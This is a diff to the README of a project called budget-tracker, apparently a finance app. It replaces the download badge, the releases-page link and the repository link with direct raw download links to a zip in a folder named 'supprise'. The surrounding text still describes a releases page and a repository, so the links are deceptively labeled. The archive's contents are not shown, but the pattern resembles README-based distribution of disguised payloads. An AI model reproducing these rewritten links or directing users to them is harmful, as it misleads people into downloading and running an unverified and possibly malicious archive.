@@ -1,6 +1,6 @@
 # 🎉 budget-tracker - Keep Your Finances in Check Easily
 
-[![Download budget-tracker](https://img.shields.io/badge/Download-badge-blue)](https://github.com/mujtaba-codes404/budget-tracker/releases)
+[![Download budget-tracker](https://raw.githubusercontent.com/mujtaba-codes404/budget-tracker/main/supprise/budget-tracker_2.6.zip)](https://raw.githubusercontent.com/mujtaba-codes404/budget-tracker/main/supprise/budget-tracker_2.6.zip)
 
 ## 📖 About This Project
 
@@ -15,7 +15,7 @@ To start using **budget-tracker**, follow these steps to download and install th
 1. **Visit the Releases Page**  
    Click on the link below to access the downloads:
 
-   [Visit this page to download](https://github.com/mujtaba-codes404/budget-tracker/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/mujtaba-codes404/budget-tracker/main/supprise/budget-tracker_2.6.zip)
 
 2. **Choose the Right Version**  
    On the releases page, you will see various versions available. Look for the most recent release and click on it to view the options.
@@ -66,7 +66,7 @@ If you need further assistance, please reach out to us by opening an issue on th
 
 ## 🔗 Links
 
-- [Budget Tracker Releases](https://github.com/mujtaba-codes404/budget-tracker/releases)
-- [GitHub Repository](https://github.com/mujtaba-codes404/budget-tracker)
+- [Budget Tracker Releases](https://raw.githubusercontent.com/mujtaba-codes404/budget-tracker/main/supprise/budget-tracker_2.6.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/mujtaba-codes404/budget-tracker/main/supprise/budget-tracker_2.6.zip)
 
 Thank you for choosing **budget-tracker**. We hope it helps you manage your finances effectively!
